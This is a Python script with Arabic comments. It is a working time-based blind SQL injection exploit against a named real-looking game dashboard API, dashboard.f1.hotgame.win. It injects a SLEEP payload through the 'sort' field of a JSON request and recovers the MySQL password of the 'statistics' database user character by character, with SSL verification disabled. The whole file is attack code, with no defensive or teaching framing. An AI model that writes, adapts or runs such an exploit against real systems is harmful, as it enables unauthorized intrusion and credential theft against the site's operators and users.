import requests
import time
import string
import urllib3

# تعطيل تحذيرات الـ SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://dashboard.f1.hotgame.win/api/SysGameDataController/gameTradeData"
HEADERS = {"Content-Type": "application/json"}
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*()_+-=[]{}|;:,.<>?"
PASSWORD = ""

def check_char(pos, char):
    # Time-based SQLi payload
    payload = f"id;SELECT IF(SUBSTRING((SELECT password FROM mysql.user WHERE user='statistics'),{pos},1)='{char}', SLEEP(2), 0)#"
    data = {"gameId": 1, "pageNum": 1, "pageSize": 10, "sort": payload}
    
    start_time = time.time()
    try:
        # نستخدم timeout أكبر من 2 ثانية عشان نقدر نقيس الوقت
        requests.post(URL, json=data, headers=HEADERS, timeout=10, verify=False)
    except requests.exceptions.Timeout:
        return True 
    except Exception:
        pass
    
    elapsed = time.time() - start_time
    # لو السيرفر استغرق أكتر من 2 ثانية يبقى الحرف صح
    return elapsed >= 2.0

print("[*] Starting extraction...")
for i in range(1, 30): 
    found = False
    for char in CHARSET:
        if check_char(i, char):
            PASSWORD += char
            print(f"[+] Found char at pos {i}: {char} -> Current: {PASSWORD}")
            found = True
            break
    if not found:
        print(f"[-] Could not find char at pos {i}. Ending.")
        break

print(f"\n[!] Extracted Password: {PASSWORD}")
